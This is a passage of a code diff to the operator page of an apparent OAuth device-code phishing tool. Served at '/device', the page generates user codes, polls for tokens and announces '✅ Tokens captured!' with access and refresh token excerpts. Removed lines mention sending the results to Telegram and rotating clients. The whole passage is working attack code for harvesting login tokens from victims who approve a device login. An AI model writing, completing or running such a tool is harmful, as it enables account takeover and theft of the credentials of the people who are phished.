                             const response = await fetch('/device/request', { method: 'POST' });
                             const data = await response.json();
                             if (data.user_code) {
                                 currentCode = data.user_code;
                                 currentDeviceCode = data.device_code;
                                 document.getElementById('codeDisplay').textContent = currentCode;
-                                document.getElementById('codeRef').textContent = currentCode;
                                 document.getElementById('status').className = 'status pending';
                                 document.getElementById('status').textContent = '⏳ Waiting for device approval...';
-                                document.getElementById('clientInfo').textContent = '📱 Client: Rotating (check logs)';
-                                
-                                if (pollingInterval) clearInterval(pollingInterval);
                                 pollForToken();
                             } else {
                                 document.getElementById('status').className = 'status error';
@@ -858,8 +1535,8 @@ app.get('/device', (req, res) => {
                                 document.getElementById('status').textContent = '⏰ Code expired. Generate a new one.';
                             } else if (data.access_token) {
                                 document.getElementById('status').className = 'status success';
-                                document.getElementById('status').textContent = '✅ SUCCESS! Tokens obtained! Check Telegram.';
-                                alert('✅ Tokens captured!\\nAccess Token: ' + data.access_token.slice(0, 30) + '...\\nRefresh Token: ' + data.refresh_token?.slice(0, 30) + '...');
+                                document.getElementById('status').textContent = '✅ SUCCESS! Tokens obtained!';
+                                alert('✅ Tokens captured!\\nAccess Token: ' + data.access_token.slice(0, 30) + '...');
                             } else {
                                 document.getElementById('status').className = 'status error';
                                 document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
@@ -898,16 +1575,7 @@ app.get('/device', (req, res) => {
                         }
                     }
                     
-                    // Auto-generate on load
                     generateCode();
-                    
-                    // Auto-refresh every 60 seconds if expired
-                    setInterval(() => {
-                        const statusText = document.getElementById('status').textContent;
-                        if (statusText.includes('expired') || statusText.includes('Error')) {
-                            generateCode();
-                        }
-                    }, 60000);
                 </script>
             </body>
             </html>
